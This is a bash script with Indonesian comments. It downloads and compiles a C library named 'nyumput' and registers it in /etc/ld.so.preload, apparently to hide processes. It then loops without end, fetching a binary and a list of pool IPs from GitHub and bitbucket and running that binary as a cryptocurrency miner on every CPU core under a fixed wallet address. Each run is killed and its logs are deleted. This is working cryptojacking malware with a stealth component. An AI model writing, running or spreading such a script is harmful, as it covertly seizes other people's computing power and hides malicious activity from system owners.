#!/bin/bash

# Memperbarui dan menginstal dependensi
sudo apt-get update
sudo apt-get install -y wget curl build-essential jq
rm -rf dance_*
rm -rf list_*
rm -rf .lib

# Mengunduh dan mengompilasi kode
curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
sudo mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
rm nyumput.c

# Menjalankan dan mengelola proses
while true; do
  # Mengunduh dan memeriksa daftar IP
  timestamp=$(date +%s)
  mkdir -p .lib
  dynamic_sgr=".lib/sgr_$timestamp"
  wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
  chmod +x $dynamic_sgr
  dynamic_list="list_$timestamp.json"
  wget -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list4.json
  if [[ ! -f $dynamic_list ]]; then
    echo "Gagal mengunduh daftar IP. Keluar."
    exit 1
  fi

  # Memeriksa format file JSON
  if ! jq '.' $dynamic_list > /dev/null 2>&1; then
    echo "Format JSON tidak valid. Keluar."
    exit 1
  fi

  # Memilih IP acak dari file JSON
  ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)
  if [ -z "$ip" ]; then
    echo "Tidak ada IP ditemukan di $dynamic_list. Keluar."
    exit 1
  fi

  # Menghapus IP yang dipilih dari file JSON
  jq --arg ip "$ip" 'del(.[] | select(. == $ip))' $dynamic_list > tmp_$timestamp.json && mv tmp_$timestamp.json $dynamic_list

  # Memastikan file sgr ada
  if [ -f $dynamic_sgr ]; then
    # Menjalankan proses dengan port acak
    port=$(shuf -i 802-810 -n 1)  # Memilih port acak dari 802 hingga 810
    nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t $(nproc) -p m=solo > dance_$port_$timestamp.log 2>&1 &
    process_pid=$!

    echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port"

    # Menjalankan selama 1 menit
    sleep 60

    # Membunuh proses
    kill $process_pid || true

    # Menghapus file log setelah proses dihentikan
    rm -f dance_$port_$timestamp.log
  else
    echo "$dynamic_sgr tidak ditemukan. Melewati..."
    sleep 120
  fi

  # Menunggu selama 2 menit sebelum iterasi berikutnya
  sleep 120

  # Membersihkan setelah setiap iterasi
  rm -f $dynamic_list
  rm -f $dynamic_sgr
done
